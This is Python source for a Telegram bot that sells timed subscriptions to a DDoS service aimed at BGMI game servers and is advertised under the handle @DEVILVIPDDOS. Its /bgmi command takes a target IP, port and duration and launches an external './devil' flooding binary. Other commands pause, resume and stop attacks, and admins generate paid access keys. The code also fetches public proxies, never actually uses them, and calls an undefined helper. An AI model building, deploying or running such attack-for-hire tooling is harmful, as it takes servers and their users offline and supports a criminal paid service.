import logging
import signal
import subprocess
import json
import random
import string
import datetime
import itertools
import requests
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from config import BOT_TOKEN, ADMIN_IDS
from keep_alive import keep_alive
keep_alive()

USER_FILE = "users.json"
KEY_FILE = "keys.json"

DEFAULT_THREADS = 0

user_processes = {}
users = {}
keys = {}

# Player statistics storage
player_stats = {}

# Set up logging
logging.basicConfig(level=logging.INFO)

# Proxy related functions
proxy_api_url = 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http,socks4,socks5&timeout=500&country=all&ssl=all&anonymity=all'
proxy_iterator = None

def get_proxies():
    global proxy_iterator
    try:
        response = requests.get(proxy_api_url)
        if response.status_code == 200:
            proxies = response.text.splitlines()
            if proxies:
                proxy_iterator = itertools.cycle(proxies)
                return proxy_iterator
    except Exception as e:
        logging.error(f"Error fetching proxies: {str(e)}")
    return None

def get_next_proxy():
    global proxy_iterator
    if proxy_iterator is None:
        proxy_iterator = get_proxies()
        if proxy_iterator is None:  # If proxies are not available
            return None
    return next(proxy_iterator, None)

def load_data():
    global users, keys
    users = load_users()
    keys = load_keys()

def load_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        logging.error(f"Error loading users: {e}")
        return {}

def save_users():
    try:
        with open(USER_FILE, "w") as file:
            json.dump(users, file)
    except Exception as e:
        logging.error(f"Error saving users: {str(e)}")

def load_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        logging.error(f"Error loading keys: {e}")
        return {}

def save_keys():
    try:
        with open(KEY_FILE, "w") as file:
            json.dump(keys, file)
    except Exception as e:
        logging.error(f"Error saving keys: {e}")

def generate_key(length=6):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def add_time_to_current_date(hours=0, days=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')

def generate_unique_id(length=10):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

# Function to generate main menu keyboard
def main_menu_keyboard():
    return ReplyKeyboardMarkup([ 
        [KeyboardButton("/bgmi")],
        [KeyboardButton("/resume ▶️"), KeyboardButton("/pause ⏸️")],
        [KeyboardButton("/view_attacks 📊")], [KeyboardButton("/stop_attack")],
        [KeyboardButton("/check_bgmi_traffic 📈 ")], 
        [KeyboardButton("/help ℹ️")],
        [KeyboardButton("/genkey 3 hours")],
        [KeyboardButton("/allusers")],
        [KeyboardButton("/attack_remove")],
        
    ], resize_keyboard=True)

# PlayerStats class to handle player statistics
class PlayerStats:
    def __init__(self, name, kills=0, deaths=0, matches_played=0):
        self.name = name
        self.kills = kills
        self.deaths = deaths
        self.matches_played = matches_played

    def display_stats(self):
        return (f"Player: {self.name}\n"
                f"Kills: {self.kills}\n"
                f"Deaths: {self.deaths}\n"
                f"Matches Played: {self.matches_played}")

# Command handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    username = update.message.from_user.username
    if user_id not in users:
        await update.message.reply_text("❌ You don't have an active subscription. Please contact the admin for assistance.Buy Form @DEVILVIPDDOS", reply_markup=main_menu_keyboard())
    else:
        expiration_date = users[user_id]
        await update.message.reply_text(f"👋 Welcome {username}!\n Your subscription is active until {expiration_date}.\n This Tool is provided by @DEVILVIPDDOS", reply_markup=main_menu_keyboard())

async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ You don't have an active subscription.")
        return

    if len(context.args) != 3:
        await update.message.reply_text("🛡️ Usage: /bgmi <target_ip> <port> <duration>")
        return

    target_ip = context.args[0]
    try:
        port = int(context.args[1])
        duration = int(context.args[2])
    except ValueError:
        await update.message.reply_text("⚠️ Port and duration must be integers.")
        return

    proxy = get_next_proxy()
    if proxy is None:
        await update.message.reply_text("🚫 No proxies available.")
        return

    # Updated command to remove protocol (udp/tcp)
    command = ['./devil', target_ip, str(port), str(duration)]
    try:
        process = subprocess.Popen(command)
        # Generate and display a unique attack ID
        unique_id = generate_unique_id()
        user_processes[user_id] = {
            "process": process,
            "command": command,
            "target_ip": target_ip,
            "port": port,
            "paused": False,
            "id": unique_id  # Store the attack ID
        }
        
        await update.message.reply_text(f"🚀 Flooding started on {target_ip}:{port} for {duration} seconds.\n🔑 Attack ID: {unique_id} has been generated for your session.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error starting attack: {str(e)}")

async def display_player_stats(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id not in player_stats:
        await update.message.reply_text("❌ You don't have player statistics recorded.")
        return

    stats = player_stats[user_id]
    await update.message.reply_text(stats.display_stats())

async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id not in user_processes:
        await update.message.reply_text("🛑 You don't have an active attack.", reply_markup=main_menu_keyboard())
        return
    try:
        user_processes[user_id]["process"].terminate()
        del user_processes[user_id]
        await update.message.reply_text("✅ Attack stopped.", reply_markup=main_menu_keyboard())
    except Exception as e:
        await update.message.reply_text(f"❌ Error stopping attack: {str(e)}", reply_markup=main_menu_keyboard())

async def pause_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id not in user_processes or user_processes[user_id]["paused"]:
        await update.message.reply_text("⏸️ No ongoing attack to pause.")
        return
    process = user_processes[user_id]["process"]
    try:
        process.send_signal(signal.SIGSTOP)
        user_processes[user_id]["paused"] = True
        await update.message.reply_text("✅ Attack paused.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error pausing attack: {str(e)}")

async def resume_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id not in user_processes or not user_processes[user_id]["paused"]:
        await update.message.reply_text("▶️ No paused attack to resume.")
        return
    process = user_processes[user_id]["process"]
    try:
        process.send_signal(signal.SIGCONT)
        user_processes[user_id]["paused"] = False
        await update.message.reply_text("✅ Attack resumed.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error resuming attack: {str(e)}")

async def view_attacks(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id not in user_processes:
        await update.message.reply_text("📊 No ongoing attacks.")
        return

    attack_details = "\n".join([f"Attack ID: {details['id']}, Target: {details['target_ip']}:{details['port']}" for details in user_processes.values()])
    await update.message.reply_text(f"📊 Ongoing attacks:\n{attack_details}")

async def attack_remove(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if len(context.args) != 1:
        await update.message.reply_text("⚠️ Usage: /attack_remove <attack_id>")
        return

    attack_id = context.args[0]
    attack_found = False
    if user_id in user_processes and user_processes[user_id]["id"] == attack_id:
        process = user_processes[user_id]["process"]
        try:
            process.terminate()
            del user_processes[user_id]
            await update.message.reply_text(f"✅ Attack with ID {attack_id} has been stopped and removed.")
            attack_found = True
        except Exception as e:
            await update.message.reply_text(f"❌ Error removing attack: {str(e)}")
    
    if not attack_found:
        await update.message.reply_text(f"❌ No attack found with ID {attack_id}.")

async def check_bgmi_traffic(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    # Simulate checking BGMI traffic
    await update.message.reply_text("📈 Checking BGMI traffic...\nThe current traffic status is normal. No issues detected.")

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        command = context.args
        if len(command) == 2:
            try:
                time_amount = int(command[0])
                time_unit = command[1].lower()
                if time_unit == 'hours':
                    expiration_date = add_time_to_current_date(hours=time_amount)
                elif time_unit == 'days':
                    expiration_date = add_time_to_current_date(days=time_amount)
                else:
                    raise ValueError("Invalid time unit")
                key = generate_key()
                keys[key] = expiration_date
                save_keys()
                response = f"Key generated: {key}\nExpires on: {expiration_date}"
            except ValueError:
                response = "Please specify a valid number and unit of time (hours/days)."
        else:
            response = "Usage: /genkey <amount> <hours/days>"
    else:
        response = "ONLY OWNER CAN USE💀OWNER @DEVILVIPDDOS"

    await update.message.reply_text(response)

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    command = context.args
    if len(command) == 1:
        key = command[0]
        if key in keys:
            expiration_date = keys[key]
            if user_id in users:
                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            else:
                users[user_id] = expiration_date
            save_users()
            del keys[key]
            save_keys()
            response = f"✅Key redeemed successfully!"
        else:
            response = "Invalid or expired key buy from @DEVILVIPDDOS."
    else:
        response = "Usage: /redeem <key>"

    await update.message.reply_text(response)

async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        if users:
            response = "Authorized Users:\n"
            for user_id, expiration_date in users.items():
                try:
                    user_info = await context.bot.get_chat(int(user_id), request_kwargs={'proxies': get_proxy_dict()})
                    username = user_info.username if user_info.username else f"UserID: {user_id}"
                    response += f"- @{username} (ID: {user_id}) expires on {expiration_date}\n"
                except Exception:
                    response += f"- User ID: {user_id} expires on {expiration_date}\n"
        else:
            response = "No data found"
    else:
        response = "ONLY OWNER CAN USE."
    await update.message.reply_text(response)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("ℹ️ Help Menu:\n"
                                      "/start - Start the bot\n"
                                      "/bgmi - Start a new attack\n"
                                      "/stop_attack - Stop an ongoing attack\n"
                                      "/pause - Pause an ongoing attack\n"
                                      "/resume - Resume a paused attack\n"
                                      "/view_attacks - View ongoing attacks\n"
                                      "/attack_remove - Remove an attack using its ID\n"
                                      "/check_bgmi_traffic - Check current BGMI traffic\n"
                                      "/redeem - Redeem your key\n"
                                      "/genkey - Generate a key (Admin only)\n"
                                      "/allusers - Show all users (Admin only)\n"
                                      "/help - Display this help message", reply_markup=main_menu_keyboard())

if __name__ == '__main__':
    load_data()
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("bgmi", bgmi))
    app.add_handler(CommandHandler("stop_attack", stop_attack))
    app.add_handler(CommandHandler("pause", pause_attack))
    app.add_handler(CommandHandler("resume", resume_attack))
    app.add_handler(CommandHandler("view_attacks", view_attacks))
    app.add_handler(CommandHandler("attack_remove", attack_remove))
    app.add_handler(CommandHandler("check_bgmi_traffic", check_bgmi_traffic))
    app.add_handler(CommandHandler("genkey", genkey))
    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("allusers", allusers))
    app.add_handler(CommandHandler("help", help_command))

    app.run_polling()


